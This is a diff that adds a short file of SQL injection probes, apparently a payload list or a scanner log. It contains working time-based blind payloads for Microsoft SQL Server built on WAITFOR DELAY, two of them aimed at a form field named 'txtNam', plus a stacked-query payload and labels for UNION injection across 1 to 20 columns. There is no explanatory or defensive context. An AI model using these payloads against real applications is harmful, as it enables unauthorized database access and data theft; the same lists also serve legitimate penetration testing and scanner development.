@@ -1,0 +1,24 @@
+11'; IF (1=1) WAITFOR DELAY '00:00:05'--
+txtNam: 11'; WAITFOR DELAY '00:00:05'--
+txtNam: 11'; IF (1=1) WAITFOR DELAY '00:00:05'--
+Union SQLi with 1 columns
+Union SQLi with 2 columns
+Union SQLi with 3 columns
+Union SQLi with 4 columns
+Union SQLi with 5 columns
+Union SQLi with 6 columns
+Union SQLi with 7 columns
+Union SQLi with 8 columns
+Union SQLi with 9 columns
+Union SQLi with 10 columns
+Union SQLi with 11 columns
+Union SQLi with 12 columns
+Union SQLi with 13 columns
+Union SQLi with 14 columns
+Union SQLi with 15 columns
+Union SQLi with 16 columns
+Union SQLi with 17 columns
+Union SQLi with 18 columns
+Union SQLi with 19 columns
+Union SQLi with 20 columns
+Stacked Queries: 11'; WAITFOR DELAY '00:00:05'; SELECT 1--
